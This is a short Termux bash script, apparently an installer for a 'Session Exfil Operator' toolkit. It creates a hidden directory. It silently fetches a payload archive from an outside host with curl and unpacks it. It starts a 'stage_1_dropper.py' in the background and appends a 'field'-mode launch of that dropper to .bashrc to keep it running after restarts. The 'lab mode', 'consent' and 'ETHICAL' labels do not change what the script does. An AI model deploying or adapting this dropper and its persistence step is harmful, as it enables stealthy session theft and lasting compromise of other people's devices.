
#!/data/data/com.termux/files/usr/bin/bash

echo "[*] Session Exfil Operator | Deploying..."

# Create hidden payload dir
mkdir -p ~/.session_ops/.core

# Pull latest suite (you'd host this on a private endpoint ideally)
echo "[*] Downloading encrypted payload chain..."
curl -s -L https://example.com/session_exfil_OPERATOR_FINAL_10X_STEALTH_ETHICAL.zip -o ~/.session_ops/.core/core.zip

# Extract payloads
unzip -o ~/.session_ops/.core/core.zip -d ~/.session_ops/.core/ > /dev/null 2>&1

# Make control panel script executable
chmod +x ~/.session_ops/.core/operator_menu.sh

# Deploy launcher in lab mode with consent
echo "[*] Launching in lab mode (default safety)..."
python3 ~/.session_ops/.core/stage_1_dropper.py --lab --consent &

# Add persistence to .bashrc or termux boot
echo "python3 ~/.session_ops/.core/stage_1_dropper.py --field --consent &" >> ~/.bashrc

echo "[✓] Deployment Complete."
